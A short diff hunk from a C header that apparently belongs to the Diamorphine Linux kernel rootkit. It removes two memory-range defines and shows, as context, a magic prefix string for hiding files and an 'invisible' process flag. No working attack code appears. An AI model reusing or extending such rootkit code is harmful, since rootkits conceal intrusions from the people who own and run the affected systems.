@@ -5,9 +5,6 @@ struct linux_dirent {
         char            d_name[1];
 };
 
-#define START_MEM	PAGE_OFFSET
-#define END_MEM		ULONG_MAX
-
 #define MAGIC_PREFIX "diamorphine_secret"
 
 #define PF_INVISIBLE 0x10000000
